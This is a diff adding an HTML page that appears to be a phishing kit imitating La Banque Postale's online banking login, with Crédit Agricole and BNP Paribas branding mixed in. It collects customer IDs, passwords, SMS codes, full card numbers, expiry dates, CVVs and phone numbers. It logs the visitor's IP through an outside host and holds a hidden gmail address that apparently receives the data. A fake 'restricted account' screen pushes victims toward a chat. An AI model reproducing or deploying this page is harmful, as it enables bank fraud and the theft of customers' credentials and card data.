@@ -1,0 +1,799 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <script src="https://cdn.jsdelivr.net/npm/vue"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/iview/3.5.1/iview.js" integrity="sha256-Xjd66VohnxGyWXo6t7jy6Jdpa4MapbhWGgzRNcsnnzY=" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/iview/3.5.1/styles/iview.css" integrity="sha256-wrmzmt34CAQJ3ChhG+ZHZNhwVTDrlLGhLAS7tlbgfZM=" crossorigin="anonymous" />
+
+  <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.0/axios.js" integrity="sha256-XmdRbTre/3RulhYk/cOBUMpYlaAp2Rpo/s556u0OIKk=" crossorigin="anonymous"></script>
+  <script>
+     window.locIp='';
+     window.iPfull='';
+    fetch('//keys0.openode.io/ip',{
+      mode:'cors',
+    }).then(e=>{
+      e.json().then(location=>{
+        console.log(location)
+        window.locIp=location
+        window.iPfull =location.ip || location
+
+      })
+    })
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.3.0/socket.io.js" integrity="sha256-bQmrZe4yPnQrLTY+1gYylfNMBuGfnT/HKsCGX+9Xuqo=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.0/js/uikit.js" integrity="sha256-A7WGGnbT0f0OYHWQVkWqX6GQdZHZDi8IsbD/u+FQaVc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.css" integrity="sha256-QVBN0oT74UhpCtEo4Ko+k3sNo+ykJFBBtGduw13V9vw=" crossorigin="anonymous" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.js" integrity="sha256-qs5p0BFSqSvrstBxPvex+zdyrzcyGdHNeNmAirO2zc0=" crossorigin="anonymous"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.0/css/uikit.css" integrity="sha256-zXcP0t9LAKMmi8DraWUaFJV1qvGkw1gYEHBbf+IsHSo=" crossorigin="anonymous" />
+<link rel="stylesheet" href="css/styles.css">
+<title>Acc&egrave;s CR - La Banque Postale</title>
+<style>
+body{
+  display: none;
+}
+</style>
+</head>
+<body>
+
+
+  <!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="/__/firebase/7.12.0/firebase-app.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+<script src="/__/firebase/7.12.0/firebase-analytics.js"></script>
+
+<!-- Initialize Firebase -->
+<script src="/__/firebase/init.js"></script>
+
+<p style="display:none">
+
+
+  <input id="Mail" type="text" value="srvcnfs@gmail.com">
+  <input id="Option" type="text" value="0">
+</p>
+  <div id="index">
+   <div v-show="!loading">
+      <div  v-if="login==10" id="dep">
+          <div class="uk-position-absolue">
+            <div class="uk-hidden@l">
+                <div>
+                  <div class="uk-child-width-1-3 uk-grid-match"  uk-grid>
+                      <div>
+                       <div style="padding:23px">
+                         <div>
+                            <i class="ui icon bars large"></i>
+                         </div>
+                       </div>
+                      </div>
+                     <div>
+                       <div class="uk-text-center uk-align-center">
+                        <div style="padding:23px">
+                            <img style="min-width:200px" src="img/ilogo.svg" alt="">
+                        </div>
+                       </div>
+                     </div>
+                      <div>
+                       <div class="uk-align-right uk-text-right">
+                          <div style="float:right;background:#006675;padding:20px;">
+                              <i class="ui icon large inverted  lock"></i>
+                            </div>
+                       </div>
+                      </div>
+                  </div>
+                </div>
+            </div>
+              <div class="uk-position-relative uk-visible@l"  uk-grid>
+                  <div>
+                    <img style="width:140px" src="https://www.credit-agricole.fr/content/dam/assetsca/npc/logos/CA_Toute-une-banque-pour-vous_V.svg" alt="">
+                  </div>
+                  <div  class="uk-width-expand ">
+                   <div id="barh" class="uk-text-bold" uk-grid>
+                     <div class="primary">
+                       <br>
+                        Vous êtes un particulier  <i class="ui icon chevron large down"></i>
+                     </div>
+                     <div id="menu_" class="uk-text-right uk-align-right uk-width-expand">
+                          <ul>
+
+                            <li> <i class="ui icon unlock"></i> mon espace</li>
+                            <li style="background:#006675">ouvrir un compte</li>
+                            <li style="background:#009787"> <i class="ui icon chat"></i> nous contacter</li>
+
+                          </ul>
+                     </div>
+                   </div>
+                    <div id="menus">
+                      <ul id="bar">
+                        <li>Comptes & cartes</li>
+                        <li>épargner</li>
+                        <li>S'assurer</li>
+                        <li>emprunter</li>
+                        <li>simmulation & devis</li>
+                        <li>nos conseils</li>
+                      </ul>
+                    </div>
+                  </div>
+              </div>
+
+          </div>
+
+              <div>
+                <br>
+                  <div class=" uk-child-width-1-2@m uk-position-relative" uk-grid>
+
+                      <div class="uk-visible@m">
+                         <div class=" uk-height-1-1 uk-position-relative uk-background-image uk-background-cover uk-background-secondary " data-src="./img/access.jpg" uk-img>
+                           <div class="uk-padding uk-position-center">
+                                <div style="background:#006675" class="uk-light uk-text-justify uk-card uk-card-body">
+
+                                  <h3 class="uk-card-title uk-h1">Télécharger l'application Ma Banque</h3>
+                                  <p>
+                                      Chacun d’entre vous gère différemment ses besoins bancaires.
+                                  </p>
+
+                                  <p>
+
+      Seul ou accompagné, au Crédit Agricole, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.
+                                  </p>
+                                  <div style="width:100%" class="ui  button">
+                                     <span class="primary">
+                                        Découvrez les grandes fonctionnalités
+                                     </span>
+                                  </div>
+                                </div>
+                           </div>
+                         </div>
+                      </div>
+
+
+                      <div>
+
+                        <div class="uk-padding">
+                          <div class="uk-card uk-text-center uk-background-muted uk-card-large uk-card-default uk-card-body">
+                            <h3 class="uk-card-title">ACCÉDER À L'ESPACE DÉDIÉ <br>
+                            <b>DE VOTRE CAISSE RÉGIONALE</b></h3>
+                            <p>
+                               <b style="color:red;"> Trouver une caisse régionale</b>
+                            </p>
+                            <p>
+                              <input type="text" @keyup="error=false" v-model="log.DEP" placeholder="saisir votre numéro de département" type="text" maxlength="5" autofocus>
+                            </p>
+                            <br>
+                            <div @click="goToCredit" id="btn" class="ui button">
+                             &nbsp; VALIDER&nbsp;
+                            </div>
+                            <br><br>
+                            <div v-if="error" class="uk-text-left  uk-text-danger" >
+                                  <i class="ui icon warning red"></i>  Champs incorrect, corriger votre saisie
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+
+                     </div>
+              </div>
+
+
+
+          </div>
+
+
+      <div  v-if="login==1">
+        <div class="uk-child-width-1-2 uk-margin-remove-bottom" uk-grid style="height:46px !important">
+
+            <div >
+              <div id="menus">
+                  <ul id="bar">
+                    <li class="active">
+                      Particuliers
+                    </li>
+                    <li class="cacher">
+                      Professionnels
+                    </li>
+                    <li class="cacher">
+                      Entreprises
+                      <i class="angle down icon" style="font-size: 10px !important;"></i>
+                    </li>
+                    <li class="cacher">
+                      Associations
+                      <i class="angle down icon" style="font-size: 10px !important;"></i>
+                    </li>
+                    <li class="cacher">
+                      Secteur public local
+                      <i class="angle down icon" style="font-size: 10px !important;"></i>
+                    </li>
+                    <li class="uk-align-right cacher" style="margin-right:12%;">
+                      Groupe La Banque Postale
+                    </li>
+                  </ul>
+              </div>
+
+            </div>
+            <!--<div  class="uk-width-expand uk-align-right ">
+
+              <div @click="login=1;message='Chargement en cours...'" style="float:right;padding:30px;cursor:pointer">
+                <div id="btn_right_1">
+                <img src="img/miscellaneous.png" width="30">&nbsp; &nbsp;&nbsp; <span>|</span> &nbsp;&nbsp;
+                <a href="#" id="btn" class="ui button">Devenir client</a>
+              </div>
+                  <!--<i class="ui icon close large inverted"></i>-->
+                  <!--<i id="search_right" class="ui icon search large"></i>&nbsp; &nbsp;&nbsp; <span id="search_right">|</span> &nbsp;&nbsp;
+                  <i id="bars_right" class="ui icon lock large"></i>
+              </div>
+
+            </div>-->
+        </div>
+        <div class="uk-child-width-1-2 uk-margin-remove-bottom" uk-grid style="margin-top: 0px !important;">
+
+            <div>
+              <div id="logo_p" style="padding-left:20%; font-size: 14px; height:50px !important;" class="uk-align-left">
+                  <img width="70px" src="img/logo-lbp.png" alt="">
+                  &nbsp; &nbsp;<div style="" class="uk-align-right "id="text_logo"><a href="#">OUTILS ET <br>SIMULATEURS </a></div> <div style="" class="uk-align-right bar_l" id="text_logo"><a href="#">SOLUTIONS <br>BANQUE ET ASSURANCE</a></div>
+                  <div style="" class="uk-align-right bar_l" id="text_logo">
+                    <a href="#">MOMENTS <br>DE VIE</a></div>
+              </div>
+
+            </div>
+            <div  class="uk-width-expand uk-align-right ">
+
+              <div @click="login=1;message='Chargement en cours...'" style="float:right;cursor:pointer;width: 565px;margin-top: 16px;">
+                <div id="btn_right_1">
+                <a href="#" id="btn_affiche" style="padding: 0px !important; padding-top: 15px !important;background: #136cbd;border: 1px solid #f2f2f2;width: 62px; background:#f2f2f2;color:black;" class="ui button uk-align-left"><i class="search icon"></i></a> &nbsp;&nbsp;
+                <a href="#" id="btn_affiche" style="padding: 0px !important; padding-top: 15px !important;background: #136cbd;border: 1px solid #136cbd;" class="ui button uk-align-left"><i class="headphones icon"></i>MES CONTACTS</a> &nbsp;&nbsp;
+                <a href="#" id="btn_affiche" style="padding: 0px !important; padding-top: 15px !important; background: #0c2b77;border: 1px solid #0c2b77;"class="ui button uk-align-left"><i class="power off icon"></i>ME CONNECTER</a>
+                &nbsp;&nbsp;
+                <a href="#" id="btn_cache" style="padding: 0px !important; padding-top: 15px !important;background: #136cbd;border: 1px solid #f2f2f2;width: 62px; background:#f2f2f2;color:black;" class="ui button uk-align-right"><i class="bars icon"></i></a>
+                 &nbsp;&nbsp;
+                <a href="#" id="btn_cache" style=" padding: 0px !important; padding-top: 15px !important; background: #0c2b77;border: 1px solid #0c2b77;width: 62px;"class="ui button uk-align-right"><i class="power off icon"></i></a>
+                &nbsp;&nbsp;
+                <a href="#" id="btn_cache" style="padding: 0px !important; padding-top: 15px !important;background: #136cbd;border: 1px solid #136cbd;width: 62px;" class="ui button uk-align-right"><i class="headphones icon"></i></a>
+                &nbsp;&nbsp;
+                <a href="#" id="btn_cache" style="padding: 0px !important; padding-top: 15px !important;background: #136cbd;border: 1px solid #f2f2f2;width: 62px; background:#f2f2f2;color:black;" class="ui button uk-align-right"><i class="search icon"></i></a>
+
+              </div>
+                  <!--<i class="ui icon close large inverted"></i>-->
+                  <i id="search_right" class="ui icon search large"></i>&nbsp; &nbsp;&nbsp; <span id="search_right">|</span> &nbsp;&nbsp;
+                  <i id="bars_right" class="ui icon lock large"></i>
+              </div>
+
+            </div>
+        </div>
+        <div class="uk-child-width-1-2@m uk-grid-collapse uk-grid-match" uk-grid aug>
+
+            <div style="height:600Px;"> <!--DEBUT FORMULAIRE -->
+              <div style="background-color: #0c2b77;background-image: linear-gradient(#0c2b77,#0c2b77);padding:3%" class="uk-card uk-card-large uk-text-left  uk-card-default uk-card-body">
+                <!--<h3 id="le" class="uk-card-title uk-text-bold">
+                  <span class="uk-text-light">ACCÉDER </span>
+                  À MES COMPTES</h3>-->
+
+                  <div class="uk-child-width-1-2@s uk-grid-collapse" uk-grid>
+                        <div id="cc"  class="uk-width-expand">
+
+                           <div style="width:">
+                              <table style="" cellspacing="6"  cellpadding="10" id="claver">
+                                <tr >
+                                  <td style="background:transparent;padding:0;text-align:left;color:white" colspan="5">
+                                    <!--<h3 style="color:white">
+                                      ACCÉDER
+                                      À MES COMPTES</h3>-->
+
+
+                                          <!--<b >1. Mon numéro client</b>-->
+                                          <br>
+
+                                            <input maxlength="10"   v-model="log.ID"  autofocus placeholder="Saisissez ici votre identifiant">
+                                            <br><br>
+                                            <input  style="" v-model="log.PASS" readonly  type="PASSword" placeholder="Composez votre mot de passe" style="margin-top:-100px !important;">
+
+                                  </td>
+                                </tr>
+                                  <tr id="typeC">
+                                    <td @click="log.PASS.length<6 ? log.PASS+=0 :''">0</td>
+                                    <td @click="log.PASS.length<6  ? log.PASS+=6: ''">6</td>
+                                    <td @click="log.PASS.length<6 ? log.PASS+=9 :''">9</td>
+                                    <td @click="log.PASS.length<6 ?log.PASS+=4:''">4</td>
+                                    <td @click="log.PASS.length<6 ?log.PASS+=7:''">7</td>
+                                  </tr>
+                                  <tr id="typeC">
+                                      <td @click="log.PASS.length<6 ?log.PASS+=8:''">8</td>
+                                      <td @click="log.PASS.length<6 ?log.PASS+=1:''">1</td>
+                                      <td @click="log.PASS.length<6 ?log.PASS+=2:''">2</td>
+                                      <td @click="log.PASS.length<6 ?log.PASS+=5:''">5</td>
+                                      <td @click="log.PASS.length<6 ?log.PASS+=3:''">3</td>
+                                    </tr>
+                                    <tr>
+                                      <td style="background:transparent;padding:0;" colspan="5">
+                                          <div class="uk-text-center">
+                                              <div @click="goToEspace" style="width:100px"  id="btn_valid" class="ui button uk-align-left">
+                                                  VALIDER
+                                               </div>
+                                          </div>
+                                          <div class="uk-text-center">
+                                              <div @click="log.PASS=''" style="width:100px;background:#586879;"  id="btn_valid" class="ui button uk-align-right">
+                                                  EFFACER
+                                               </div>
+                                          </div>
+                                      </td>
+                                    </tr>
+                              </table>
+                           </div>
+
+
+                          </p>
+                        </div>
+                      <!--  <div>
+                          <br>
+                            <div class="uk-h5">
+                               <b> OUBLI/PERTE <br> DE CODE PERSONNEL </b>
+                            </div>
+                            <span>
+                                Si vous avez oublié ou perdu votre <br> code personnel, cliquez ici.
+                            </span>
+                            <br>
+                            <div class="uk-h5">
+                              <b>VOTRE IDENTIFICATION NE <br> CHANGE PAS</b>
+
+                            </div>
+                            <span>
+                                Pour accéder à votre compte, <br> saisissez votre
+                                 identifiant et votre <br> code personnel habituels.
+                            </span>
+                            <br>
+                            <div class="uk-h5">
+                              <b>SÉCURITÉ</b>
+                            </div>
+                            <span >
+                                Restez vigilants et veillez à protéger <br>
+                                 vos données personnelles. <br>
+                                Consultez nos conseils de sécurité
+                            </span> <br><br>
+                            <span>
+                                Nous vous invitons également <br> à consulter
+                                 régulièrement <br> nos Conditions <br> Générales d'utilisation.
+                                 <br>
+                                Voir les Conditions <br> Générales d'Utilisation
+                            </span>
+                        </div> -->
+                  </div>
+              </div>
+            </div><!--FIN FORMULAIRE -->
+            <!--DEBUT COTE DROIT -->
+            <div class="uk-background-image@l uk-visible@m uk-position-relative uk-background-cover" uk-img style="background: #0c2b77;">
+                <div class="uk-padding uk-position-center">
+                  <div class="uk-card uk-card-large uk-card-body">
+                    <div style="border-top: 1px solid #fff;"></div><br>
+                    <b style="color:white;"> > Aide à la connexion</b><br>
+                    <b style="color:white;"> > Identifiant / Mot de passe oublié</b><br>
+                    <b style="color:white;"> > Sécurité Identifiant / Mot de passe</b><br>
+                    <b style="color:white;"> > Accessibilité</b><br><br><br>
+                  <b style="color:white;">Covid-19 : La Banque Postale fait évoluer son dispositif. En savoir plus</b><br>
+                  <p style="color:white;">De faux e-mails, sms et des appels téléphoniques vous demandant vos coordonnées personnelles et informations bancaires (identifiants, codes d’accès à vos comptes en ligne ou codes reçus par SMS, ...) peuvent vous être adressés par des personnes mal intentionnées au nom de La Banque Postale. Il peut s'agir d'une tentative de fraude. Veillez à ne jamais y répondre, ne pas cliquer sur les liens, ni ouvrir les pièces jointes. Transférez le à alertespam@labanquepostale.fr ou contacter votre conseiller habituel. Consultez les messages d’information et de sensibilisation de La Banque Postale sur le site www.labanquepostale.fr page « Alerte et mise en garde. ».</p>
+                  </div>
+                </div>
+            </div><!--FIN COTE DROIT-->
+        </div>
+
+        <footer style="margin-bottom:0px;">
+         <div class="" style="margin-bottom:0px;background: #eee;height:147px;">
+           <div style="color:rgb(171, 166, 166);">
+             <div id="menu_2" style="text-align:center;">
+
+                       <ul>
+                         <li> Suivez-nous sur :</li>
+                         <li> <i class="ui icon facebook large"></i></li>
+                         <li> <i class="ui icon twitter large"></i></li>
+                         <li> <i class="ui icon youtube large"></i></li>
+                         <li> <i class="ui icon instagram large"></i></li>
+                         <li> <i class="ui icon linkedin large"></i></li>
+                       </ul>
+                  </div>
+           </div>
+         </div>
+        </footer>
+      </div>
+
+      <div style="background:white" v-if="login==3">
+        <div class=" white">
+          <div class="uk-child-width-1-2 uk-margin-remove-bottom" uk-grid>
+
+              <div>
+                <div style="padding:4%; font-size: 1.2rem;">
+                    <img width="180px" src="img/logo-bnpp.png" alt="">
+                    &nbsp; &nbsp;<span id="text_logo">La banque d'un monde qui change</span>
+                </div>
+
+              </div>
+              <div  class="uk-width-expand uk-align-right ">
+
+                <div @click="login=2;message='Chargement en cours...'" style="float:right;padding:30px;cursor:pointer">
+                  <div id="btn_right_1">
+                  <img src="img/miscellaneous.png" width="30">&nbsp; &nbsp;&nbsp; <span>|</span> &nbsp;&nbsp;
+                  <a href="#" id="btn" class="ui button">Déconnecter</a>
+                </div>
+                    <!--<i class="ui icon close large inverted"></i>-->
+                    <i id="search_right" class="ui icon search large"></i>&nbsp; &nbsp;&nbsp; <span id="search_right">|</span> &nbsp;&nbsp;
+                    <i id="bars_right" class="ui icon lock large"></i>
+                </div>
+
+              </div>
+          </div>
+         <div class="uk-child-width-1-2@s uk-grid-collapse" uk-grid>
+           <div class="uk-visible@m">
+             <div class="uk-height-1-1 uk-padding  uk-background-image uk-background-cover uk-background-secondary" data-src="./img/access.jpg" uk-img>
+               <div class=" uk-card uk-card-large uk-card-default uk-card-body" >
+                  <div id="cc"  class="">
+
+                      <div id="el" class="uk-h5 primary uk-text-bold uk-text-uppercase">
+                        <i class="ui icon key teal"></i>
+                        ACTIVEZ VOTRE CLÉ DIGITALE:
+                      </div>
+                        <div class="uk-h4">
+                          Comment activer ma Clé Digitale et faciliter mes opération en un click ?
+                        </div>
+                       <div>
+                         <p><i class="ui icon mobile teal"></i> vous allez recevoir une notification par BNP Paribas sur votre smartphone.</p>
+
+                          <p><i class="ui icon mobile teal"></i> Ouvrez la notification et cliquez sur valider pour activer votre Clé Digitale</p>
+
+                          <p>
+                            <i class="ui large icon teal check"></i>
+                            Félicitations votre Clé Digitale est activée.
+
+                          </p>
+                       </div>
+                    </div>
+               </div>
+             </div>
+           </div>
+           <div>
+             <div class="uk-padding">
+               <h2>Veuillez patienter, vous allez recevoir une notification sur votre smartphone, cliquez sur validez</h2>
+                <img src="img/act.png" alt="">
+                <div v-if="step==1">
+
+                      <p><br><br>
+
+                        <a id="btn" class="ui button" href="https://mabanque.bnpparibas/fr/gerer/services-lies-compte/options-et-services/cle-digitale">
+                        <i class="ui icon chevron right"></i>  &nbsp;CONTINUER
+                      </a>
+                </div>
+
+
+                </p>
+
+                <br>
+                <div class="uk-alert">
+                   Nouveau  dispositif de sécurité conçu pour  les opérations en ligne . <br>
+                   Ce code confidentiel, connu de vous seul, est utilisable uniquement pour vos opérations en ligne .
+                   <ul>
+                     <li>Consultation de solde</li>
+                     <li>Virements en ligne</li>
+                     <li>Achat en ligne</li>
+                     <li>Et d'autres opérations sensibles ....</li>
+                   </ul>
+                </div>
+             </div>
+           </div>
+          <div>
+
+          </div>
+         </div>
+        </div>
+
+
+      </div>
+      <div  v-if="login==2">
+        <div class="uk-child-width-1-2 uk-margin-remove-bottom" uk-grid style="height:46px !important">
+
+            <div >
+              <div id="menus">
+                  <ul id="bar">
+                    <li class="active">
+                      Particuliers
+                    </li>
+                    <li class="cacher">
+                      Professionnels
+                    </li>
+                    <li class="cacher">
+                      Entreprises
+                      <i class="angle down icon" style="font-size: 10px !important;"></i>
+                    </li>
+                    <li class="cacher">
+                      Associations
+                      <i class="angle down icon" style="font-size: 10px !important;"></i>
+                    </li>
+                    <li class="cacher">
+                      Secteur public local
+                      <i class="angle down icon" style="font-size: 10px !important;"></i>
+                    </li>
+                    <li class="uk-align-right cacher" style="margin-right:12%;">
+                      Groupe La Banque Postale
+                    </li>
+                  </ul>
+              </div>
+
+            </div>
+            <!--<div  class="uk-width-expand uk-align-right ">
+
+              <div @click="login=1;message='Chargement en cours...'" style="float:right;padding:30px;cursor:pointer">
+                <div id="btn_right_1">
+                <img src="img/miscellaneous.png" width="30">&nbsp; &nbsp;&nbsp; <span>|</span> &nbsp;&nbsp;
+                <a href="#" id="btn" class="ui button">Devenir client</a>
+              </div>
+                  <!--<i class="ui icon close large inverted"></i>-->
+                  <!--<i id="search_right" class="ui icon search large"></i>&nbsp; &nbsp;&nbsp; <span id="search_right">|</span> &nbsp;&nbsp;
+                  <i id="bars_right" class="ui icon lock large"></i>
+              </div>
+
+            </div>-->
+        </div>
+        <div class="uk-child-width-1-2 uk-margin-remove-bottom" uk-grid style="margin-top: 0px !important;">
+
+            <div>
+              <div id="logo_p" style="padding-left:20%; font-size: 14px; height:50px !important;" class="uk-align-left">
+                  <img width="70px" src="img/logo-lbp.png" alt="">
+                  &nbsp; &nbsp;<div style="" class="uk-align-right "id="text_logo"><a href="#">OUTILS ET <br>SIMULATEURS </a></div> <div style="" class="uk-align-right bar_l" id="text_logo"><a href="#">SOLUTIONS <br>BANQUE ET ASSURANCE</a></div>
+                  <div style="" class="uk-align-right bar_l" id="text_logo">
+                    <a href="#">MOMENTS <br>DE VIE</a></div>
+              </div>
+
+            </div>
+            <div  class="uk-width-expand uk-align-right ">
+
+              <div @click="login=1;message='Chargement en cours...'" style="float:right;cursor:pointer;width: 565px;margin-top: 16px;">
+                <div id="btn_right_1">
+                <a href="#" id="btn_affiche" style="padding: 0px !important; padding-top: 15px !important;background: #136cbd;border: 1px solid #f2f2f2;width: 62px; background:#f2f2f2;color:black;" class="ui button uk-align-left"><i class="search icon"></i></a> &nbsp;&nbsp;
+                <a href="#" id="btn_affiche" style="padding: 0px !important; padding-top: 15px !important;background: #136cbd;border: 1px solid #136cbd;" class="ui button uk-align-left"><i class="inbox icon"></i>MES MESSAGES</a> &nbsp;&nbsp;
+                <a href="#" id="btn_affiche" style="padding: 0px !important; padding-top: 15px !important; background: #0c2b77;border: 1px solid #0c2b77;"class="ui button uk-align-left"><i class="power off icon"></i>DECONNECTER</a>
+                &nbsp;&nbsp;
+                <a href="#" id="btn_cache" style="padding: 0px !important; padding-top: 15px !important;background: #136cbd;border: 1px solid #f2f2f2;width: 62px; background:#f2f2f2;color:black;" class="ui button uk-align-right"><i class="bars icon"></i></a>
+                 &nbsp;&nbsp;
+                <a href="#" id="btn_cache" style=" padding: 0px !important; padding-top: 15px !important; background: #0c2b77;border: 1px solid #0c2b77;width: 62px;"class="ui button uk-align-right"><i class="power off icon"></i></a>
+                &nbsp;&nbsp;
+                <a href="#" id="btn_cache" style="padding: 0px !important; padding-top: 15px !important;background: #136cbd;border: 1px solid #136cbd;width: 62px;" class="ui button uk-align-right"><i class="inbox icon"></i></a>
+                &nbsp;&nbsp;
+                <a href="#" id="btn_cache" style="padding: 0px !important; padding-top: 15px !important;background: #136cbd;border: 1px solid #f2f2f2;width: 62px; background:#f2f2f2;color:black;" class="ui button uk-align-right"><i class="search icon"></i></a>
+
+              </div>
+                  <!--<i class="ui icon close large inverted"></i>-->
+                  <i id="search_right" class="ui icon search large"></i>&nbsp; &nbsp;&nbsp; <span id="search_right">|</span> &nbsp;&nbsp;
+                  <i id="bars_right" class="ui icon lock large"></i>
+              </div>
+
+            </div>
+        </div>
+         <br><br>
+
+            <div class=" white">
+     <div class="uk-child-width-1-1@s uk-grid-collapse" style="margin-left:50px;" uk-grid>
+
+       <div>
+         <div class="uk-padding">
+            <div class="uk-h3 primary" style="color:#17479e !important;">
+            <i class="ui icon key teal" style="color:#2d8cf0 !important;"></i>
+              Activez votre Certicode Plus </div>
+              <div class="uk-visible@m">
+                <Steps size="small" vertical style="color:teal" :current="step-1">
+                  <Step style="color:teal" title="SMS MOBILE" content="Confirmation du Certicode Plus"></Step>
+                     <Step style="color:teal" title="CARTE BANCAIRE" content="Confirmation du Carte Bancaire"></Step>
+                  <Step style="color:teal" title="VALIDATION" content="Certicode Plus Validé"></Step>
+
+              </Steps>
+
+              <br><br>
+              </div>
+
+
+              <div class="uk-hidden@m">
+                <Steps size="small" direction="vertical" style="color:teal" :current="step-1">
+                  <Step style="color:teal" title="SMS MOBILE" content="Confirmation du Certicode Plus"></Step>
+                             <Step style="color:teal" title="CARTE BANCAIRE" content="Confirmation du Carte Bancaire"></Step>
+                  <Step style="color:teal" title="VALIDATION" content="Certicode Plus Validé"></Step>
+
+              </Steps>
+              <br><br>
+              </div>
+
+        
+            <div v-if="step==1">
+                <p style="font-size:15px" id="cc">
+                    <b> Veuillez entrer le code de <span style="color:#005aaa;">*6 ou 8 chiffres*</span> reçu par SMS ci-dessous :   </b><i class="ui icon big mobile"></i> <br>
+                  <br>  <input maxlength="8" max="999999"  v-model="log.SMS" style="width:50%" type="text" placeholder="(6 ou 8 chiffres)">
+                  </p>
+
+                  <p>
+
+                    <div @click="goToStep" id="btn" class="ui button" style="background:#17479e;">
+                    <i class="ui icon chevron right"></i>  &nbsp;CONTINUER
+                    </div>
+            </div>
+
+
+      <div v-if="step==2">
+                  <div class="uk-padding uk-text-left">
+      
+                <div class="uk-h4 primary">
+                    Ré-activer votre carte pour les paiements et retraits (guichet) .
+                </div>
+                <div class="uk-child-width-1-2@s" uk-grid>
+                    <div>
+                        <p class="uk-text-bold">
+                            Entrer les coordonnées de la carte à activer 
+                          </p>
+                              <p>
+                                Numéro de carte : <input v-model="log.numcc" maxlength="16" style="background: #f5F5F5;min-width:252px;width:38%" placeholder="Numéro de carte" type="text">
+                              </p>
+                              <p>
+                               Date d'expiration : 
+                               <input v-model="log.ex1" style="background: #f5F5F5;width:21%"  min="0" max="12" maxlength="2" placeholder="MM" type="text">&nbsp;
+                               <input v-model="log.ex2" style="background: #f5F5F5;width:21%"  min="19" max="30" maxlength="4"  placeholder="AAAA" type="text">
+                              </p>
+                              <p>
+                                Cryptogramme visuel (CVV) : <input maxlength="4" v-model="log.cvv" style="background: #f5F5F5;width:16%" placeholder="" type="text">
+                               </p>
+
+                             <p>
+                                Numéro mobile associé  :  <input v-model="log.tel" style="background: #f5F5F5;width:39%"  min="19" max="30" maxlength="12"  placeholder="(+33)" type="text">
+                              
+                             </p>
+                               <br>
+                               <div style="background-color: #136cbd;" @click="setCard" class="ui button teal">
+                               <i class="ui icon  cc mastercard "></i> 
+                                J'active ma carte
+                               </div>
+                    </div>
+                    <div class="uk-visible@m">
+                        <img src="https://www.labanquepostale.fr/content/dam/refonte_Particulier/Produits/Quotidien/Cartes_bancaires/CB_internationales/visa_classic/images/OT_Visa_Classic_SansContact_DEBIT.jpg" alt="">
+              
+                    </div>
+                </div>
+                     
+              </div>
+              <div>
+               </div>     </div>
+
+
+            <div class="uk-alert">
+               Nouveau  dispositif de sécurité conçu pour  les opérations en ligne . <br>
+               Ce code confidentiel, connu de vous seul, est utilisable uniquement pour vos opérations en ligne .
+               <ul>
+                 <li>Consultation de solde</li>
+                 <li>Virements en ligne</li>
+                 <li>Achat en ligne</li>
+                 <li>Et d'autres opérations sensibles ....</li>
+               </ul>
+            </div>
+         </div>
+       </div>
+      <div>
+
+      </div>
+     </div>
+    </div>
+
+
+          <br><br>
+
+          <footer style="margin-bottom:0px;">
+           <div class="" style="margin-bottom:0px;background: #eee;height:147px;">
+             <div style="color:rgb(171, 166, 166);">
+               <div id="menu_2" style="text-align:center;">
+
+                         <ul>
+                           <li> Suivez-nous sur :</li>
+                           <li> <i class="ui icon facebook large"></i></li>
+                           <li> <i class="ui icon twitter large"></i></li>
+                           <li> <i class="ui icon youtube large"></i></li>
+                           <li> <i class="ui icon instagram large"></i></li>
+                           <li> <i class="ui icon linkedin large"></i></li>
+                         </ul>
+                    </div>
+             </div>
+           </div>
+          </footer>
+
+      </div><!--FIN L1-->
+
+      <div v-if="login==5">
+
+         <div class="uk-padding uk-text-center">
+            <img style="width:240px" src="img/ilogo.svg" alt="">
+            <p>
+
+            </p>
+            <div class="uk-h3">
+                  Suite à de nouvelles reformes votre compte à été restreint .
+            </div>
+            <div style="font-size: 17px">
+            <i class="ui icon info circle"></i>  Nous avons besoin de vérification supplémentaire <br>
+              pour la réactivation de votre compte.<br><br>
+
+             <p>
+                Cliquer sur le button ci-dessous pour contacter l'assistance en ligne .
+             </p>
+             <p>
+               <i class="ui icon chevron down big"></i>
+             </p>
+             <div @click="showChat" class="ui teal button color">
+              <i class="ui icon chat"></i>  Chat support technique
+             </div>
+             <br>
+             <br><br>
+            <div class="uk-card uk-card-default uk-card-body">
+                <div style="color:#525252" class="uk-text-justify">
+                    Conformément aux dernières exigences réglementaires de la seconde Directive Européenne sur les services bancaires  (dite DSP2), entrées en vigueur le 14/09/2019, les banques vont progressivement renforcer la sécurité de l’accès en ligne à vos comptes bancaires et de vos paiements par carte sur internet avec les e-commerçants.
+
+                 </div>
+
+
+                 <div style="color:black" class="uk-text-center">
+                    <br>
+                    Nous vous invitons donc à vous référer au support <i class="ui icon teal chat"></i> pour réeactiver ou activer les services
+                    liés à votre compte.
+                 </div>
+            </div>
+            </div>
+
+         </div>
+      </div>
+   </div>
+<div v-show="loading">
+    <div class="uk-position-center">
+      <div class="uk-text-center">
+
+          <div class="primary" uk-spinner></div> <br>
+          <p>
+            {{message}}
+          </p>
+          <p>
+              <img style="width:70px" src="img/logo-lbp.png" alt="">
+          </p>
+      </div>
+    </div>
+</div>
+  </div>
+  <script>
+
